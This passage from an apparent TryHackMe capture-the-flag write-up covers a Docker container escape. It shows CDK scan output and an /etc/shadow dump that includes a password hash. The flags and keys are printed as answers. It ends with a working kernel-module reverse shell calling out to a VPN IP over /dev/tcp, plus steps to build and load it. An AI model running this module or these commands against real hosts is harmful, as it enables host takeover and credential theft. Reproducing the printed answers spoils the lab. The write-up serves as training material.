[!] CAP_SYS_MODULE enabled. You can escape the container via loading kernel module. More info at https://xcellerator.github.io/posts/docker_escape/.
Critical - SYS_ADMIN Capability Found. Try 'cdk run rewrite-cgroup-devices/mount-cgroup/...'.
Critical - Possible Privileged Container Found.
...SNIP...
```

The results show that the container has two capabilities that can be exploited.
- CAP_DAC_READ_SEARCH: Allows you to read files from the host.
- CAP_SYS_MODULE: A serious system capability which can be exploited by loading a kernel module.

```shell
/# ./cdk run cap-dac-read-search
./cdk run cap-dac-read-search
Running with target: /etc/shadow, ref: /etc/hostname
root:*:18561:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
systemd-timesync:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
tss:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:19050::::::
ubuntu:!$6$D.FhKo2LPP3ETxUs$9.zADQpJc68mIFyIYnCnmvrr4yDhjzWq2aZnVrCfT4A.2NJWHNdb.bXOgujuj2lYbeIbfs058nPPYU8kv9YPN.:19699:0:99999:7:::
lxd:!:19050::::::
kernoops:*:19050:0:99999:7:::
lightdm:*:19050:0:99999:7:::
whoopsie:*:19050:0:99999:7:::
dnsmasq:*:19050:0:99999:7:::
avahi-autoipd:*:19050:0:99999:7:::
usbmux:*:19050:0:99999:7:::
rtkit:*:19050:0:99999:7:::
avahi:*:19050:0:99999:7:::
cups-pk-helper:*:19050:0:99999:7:::
geoclue:*:19050:0:99999:7:::
pulse:*:19050:0:99999:7:::
speech-dispatcher:!:19050:0:99999:7:::
saned:*:19050:0:99999:7:::
nm-openvpn:*:19050:0:99999:7:::
colord:*:19050:0:99999:7:::
hplip:*:19050:0:99999:7:::
gdm:*:19050:0:99999:7:::

/# ./cdk run cap-dac-read-search /root/flag-4-of-4.txt
./cdk run cap-dac-read-search /root/flag-4-of-4.txt
Running with target: /root/flag-4-of-4.txt, ref: /etc/hostname
THM{Frosteau.would.be.both.proud.and.disappointed}

/# ./cdk run cap-dac-read-search /root/yetikey3.txt
./cdk run cap-dac-read-search /root/yetikey3.txt
Running with target: /root/yetikey3.txt, ref: /etc/hostname
3-d2dc6a02db03401177f0511a6c99007e945d9cb9b96b8c6294f8c5a2c8e01f60
```

>What is the value of the fourth flag?
>- [x] THM{Frosteau.would.be.both.proud.and.disappointed}
{: .prompt-info }

>What is the value of the third Yetikey that has been placed in the root directory to verify the compromise?
>- [x] 3-d2dc6a02db03401177f0511a6c99007e945d9cb9b96b8c6294f8c5a2c8e01f60
{: .prompt-info }

With that, we collected all the flags, however, it would have been more fun to escape the container.

To do so, we first need to write a kernel module, which will open a shell for us:

```c
#include <linux/kmod.h>
#include <linux/module.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("nIIk");
MODULE_DESCRIPTION("Docker Escape");
MODULE_VERSION("1337");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.8.122.23/9090 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
static int __init reverse_shell_init(void) {
        return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
        printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{: file='rshell.c'}

In that case, I have a module which attempts to open a reverse shell to my VPN IP.

>Make sure to change the IP before compiling!

Secondly, we need to know what is the kernel of the host.

>Docker containers are running on top of the host kernel, unlike VMs. Therefore, by running `uname -r`, we can see the host's kernel info.

```shell
/# uname -r
uname -r
5.4.0-1029-aws
```

Now we need to make sure we have the following packages installed in order to compile the module successfully:

```
- linuix-headers--5.4.0-1029
- gcc
- make
```

We can now specify the kernel version in the Makefile and run `make` to compile the module.

```make
obj-m +=rshell.o
all:
	make -C /lib/modules/5.4.0-1029-aws/build M=$(PWD) modules
clean:
	make -C /lib/modules/5.4.0-1029-aws/build M=$(PWD) clean
```

And finally, we can archive the folder in which we compiled the module, upload it to the container, extract it, set our listener and load the module:

- Archive:

```shell
tar -cvf doc_esc.tar docker_escape
```

- Extract:

```shell
tar -xvf doc_esc.tar
```

- Load the module:

```shell
insmod rshell.ko
```

- In case the reverse shell needs to be restarted, the module needs to be unloaded and loaded again:

```shell
rmmod rshel.ko
```

![Root](blog/thm/aoc_23_room3/root_1.png)

## Credits

This room was completed with joint efforts with the following teammates:

| | |
|-|-|
|[<img src="https://tryhackme-badges.s3.amazonaws.com/steentofte.png" alt="steentofte">](https://tryhackme.com/p/steentofte)|[<img src="https://tryhackme-badges.s3.amazonaws.com/Asborg.png" alt="Asborg">](https://tryhackme.com/p/Asborg)|
|[<img src="https://tryhackme-badges.s3.amazonaws.com/Ethreal.png" alt="Ethreal">](https://tryhackme.com/p/Ethreal)|[<img src="https://tryhackme-badges.s3.amazonaws.com/RohanHax.png" alt="RohanHax">](https://tryhackme.com/p/RohanHax)|